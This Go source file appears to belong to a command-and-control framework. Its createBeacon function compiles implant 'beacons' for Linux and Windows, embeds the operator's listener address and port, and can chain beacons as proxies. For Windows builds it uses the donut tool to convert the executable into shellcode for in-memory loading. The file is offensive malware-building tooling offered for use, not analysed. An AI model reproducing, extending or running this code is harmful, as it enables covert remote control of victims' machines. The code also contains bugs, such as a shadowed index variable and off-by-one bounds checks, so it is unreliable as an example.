package main

import (
	"os"
	"fmt"
	"bufio"
	"os/exec"
	"strings"
	"strconv"
)

var targets = []string{"linux", "windows"}

var platforms = map[string][]string {
	"linux": []string{"386", "amd64", "arm", "arm64"},
	"windows": []string{"386", "amd64"},
}

func createBeacon(listener int, platform string, arch string) {
	reader := bufio.NewReader(os.Stdin)
	var target string
	var targetArch string
	var platformIdx int

	if platform == "" {
		info("Pick platform")
		listTargets()
		input := readLine()
		platformIdx, err := strconv.Atoi(input)

		if err != nil || platformIdx < 0 || platformIdx > len(targets) {
			info("Invalid choice. " + err.Error())
			return
		}
		target = targets[platformIdx]
	} else {
		target = platform
	}


	if arch == "" {
		info("Pick arch")
		listPlatforms(target)
		input := readLine()
		arch, err := strconv.Atoi(input)

		if err != nil || arch < 0 || arch > len(platforms[target]) {
			info("Invalid choice.")
			return
		}
		targetArch = getPlatform(platformIdx, arch)
	} else {
		targetArch = arch
	}


	info("Using " + target + "/" + targetArch)

	//fmt.Print("Proxy? (y/n): ")
	input := "n"//, err = reader.ReadString('\n')
	ip := getIfaceIp(listeners[listener].Iface)
	port := strconv.Itoa(listeners[listener].Port)
	beaconId := genRandID()
	beaconName := beaconId//"beacon" + ip + "." + port	
	buildFlags := ""
	var cmdHandle *exec.Cmd
	var output string

	if target == "windows" {
		beaconName += ".exe"
		buildFlags += "-s -w"
	}

	//if err != nil {
	//	log.Fatal(err)
	//}

	if input == "y\n" {
		if len(beacons) == 0 {
			info("No beacons to proxy to.")
			return
		}
		listBeacons()
		fmt.Print("Choose beacon: ")
		input, err := reader.ReadString('\n')
		input = strings.ReplaceAll(input, "\n", "")

		if err != nil {
			info("Invalid input.")
			return
		}
		
		beacon := getBeaconByIdOrIndex(input)

		if beacon == nil {
			info(input + " is not a beacon.")
			return
		}

		notifyBeaconOfProxyUpdate(beacon, beaconId)

		info("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + targetArch + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go")
	} else {
		info("No proxy")
		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + targetArch + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName)
	}

	stderr, err := cmdHandle.StderrPipe()
	stdout, err := cmdHandle.StdoutPipe()
	
	if err = cmdHandle.Start(); err == nil {
		scanner := bufio.NewScanner(stderr)
		
		if err != nil {
			output += scanner.Text()
			output += "\n"
		}

		for scanner.Scan() {
			output += scanner.Text()
			output += "\n"
		}

		scanner = bufio.NewScanner(stdout)
		
		if err != nil {
			output += scanner.Text()
			output += "\n"
		}

		for scanner.Scan() {
			output += scanner.Text()
			output += "\n"
		}
	}

	if len(output) > 0 {
		info(output)
	}

	//beacon := &Beacon{"n/a", beaconId, nil, nil, nil, nil, time.Time{}}
	// beacons = append(beacons, beacon)
	info("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName)
	
	if target == "windows" {
		output = ""
		cmdHandle := exec.Command("/bin/sh", "-c", "./includes/donut -c TestModule2 -m Main out/" + beaconName + " -o out/" + beaconName + ".bin")
		stdout, err := cmdHandle.StdoutPipe()
		stderr, err := cmdHandle.StderrPipe()

		if err = cmdHandle.Start(); err == nil {
			scanner := bufio.NewScanner(stdout)
			for scanner.Scan() {
				output += scanner.Text()
				output += "\n"
			}
			
			scanner = bufio.NewScanner(stderr)
			for scanner.Scan() {
				output += scanner.Text()
				output += "\n"
			}
		}

		if len(output) > 0 {
			info(output)
		}
	}
}

func listTargets() {
	for i, n := range targets {
		info("[" + strconv.Itoa(i) + "] " + n)
	}
}

func listPlatforms(target string) {
	i := 0
	for _, n := range platforms[target] {
		info("[" + strconv.Itoa(i) + "] " + n)
		i++
	}
}

func getPlatform(idx int, idxplatform int) string {
	target := targets[idx]
	for i, n := range platforms[target] {
		if i == idxplatform {
			return n
		}
		i++
	}
	return ""
}